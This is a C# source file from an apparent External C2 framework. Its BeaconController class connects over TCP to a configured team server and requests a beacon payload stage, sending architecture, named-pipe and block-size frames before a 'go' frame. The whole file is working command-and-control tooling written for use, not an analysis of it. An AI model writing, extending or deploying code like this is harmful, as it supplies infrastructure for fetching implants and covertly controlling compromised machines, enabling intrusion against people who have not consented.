using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;

using ExternalC2.Base;

namespace ExternalC2.Controller
{
    public class BeaconController : BaseConnector, IBeaconController
    {
        protected override Stream Stream { get; set; }
        
        public IPAddress Server { get; private set; }
        public int Port { get; private set; }
        public int Block { get; private set; }

        public void Configure(IPAddress server, int port = 2222, int block = 100)
        {
            Server = server;
            Port = port;
            Block = block;
        }

        public async Task<bool> Connect()
        {
            var tcpClient = new TcpClient();
            await tcpClient.ConnectAsync(Server, Port);

            if (tcpClient.Connected)
                Stream = tcpClient.GetStream();

            return tcpClient.Connected;
        }

        public async Task<byte[]> RequestStage(string pipeName, Architecture arch)
        {
            switch (arch)
            {
                case Architecture.x86:
                    await WriteFrame(C2Frame.Generate("arch", "x86"));
                    break;
                
                case Architecture.x64:
                    await WriteFrame(C2Frame.Generate("arch", "x64"));
                    break;
                
                default:
                    throw new ArgumentOutOfRangeException(nameof(arch), arch, null);
            }

            await WriteFrame(C2Frame.Generate("pipename", pipeName));
            await WriteFrame(C2Frame.Generate("block", $"{Block}"));
            await WriteFrame(C2Frame.Generate("go"));

            var frame = await ReadFrame();
            return frame.Data;
        }

        public new async Task WriteFrame(C2Frame frame)
        {
            await base.WriteFrame(frame);
        }

        public new async Task<C2Frame> ReadFrame()
        {
            return await base.ReadFrame();
        }
    }
}